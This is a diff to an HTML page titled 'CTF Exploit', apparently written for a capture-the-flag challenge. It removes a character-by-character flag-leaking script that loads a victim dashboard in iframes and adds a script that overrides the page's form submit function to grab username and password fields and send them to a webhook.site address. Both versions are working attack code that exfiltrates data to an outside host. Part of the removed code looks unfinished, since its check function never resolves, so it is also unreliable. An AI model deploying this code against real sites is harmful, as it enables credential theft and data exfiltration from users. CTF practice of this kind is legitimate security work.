@@ -4,50 +4,23 @@
     <title>CTF Exploit</title>
 </head>
 <body>
-    <h1>Leaking flag...</h1>
-    <p id="flag"></p>
-    <iframe id="victim_frame" src="http://65.109.202.184/dashboard"></iframe>
-
+    <h1>Loading...</h1>
     <script>
+        const WEBHOOK_URL = "https://webhook.site/48f9efa9-a38a-4c44-b214-5bdde77e8adf";
 
-        const VICTIM_URL = 'http://65.109.202.184/dashboard';
-        const LEAK_SERVER = 'https://webhook.site/48f9efa9-a38a-4c44-b214-5bdde77e8adf';
+        HTMLFormElement.prototype.submit = function() {
+            console.log("Form submission hijacked!");
 
-        let leakedFlag = 'ASIS{';
-        const alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789_}';
+            const formData = new FormData(this);
+            const username = formData.get('username');
+            const password = formData.get('password');
 
-        async function leak() {
-            for (let i = 0; i < alphabet.length; i++) {
-                const char = alphabet[i];
-                const attempt = leakedFlag + char;
-
-                const didLeak = await checkChar(attempt);
-
-                if (didLeak) {
-                    leakedFlag = attempt;
-                    document.getElementById('flag').innerText = leakedFlag;
-                    if (char === '}') {
-                        fetch(`${LEAK_SERVER}/?flag=${leakedFlag}`);
-                        return;
-                    }
-                    await leak();
-                    break;
-                }
-            }
-        }
-
-        async function checkChar(prefix) {
-            return new Promise(resolve => {
-                const iframe = document.createElement('iframe');
-                iframe.src = `${VICTIM_URL}?payload=${encodeURIComponent(prefix)}`;
-
-                iframe.onload = () => {
-                };
-                document.body.appendChild(iframe);
+            fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`, {
+                mode: 'no-cors'
             });
-        }
 
-        setTimeout(leak, 8000);
+            alert("Form hijacked!");
+        };
     </script>
 </body>
 </html>
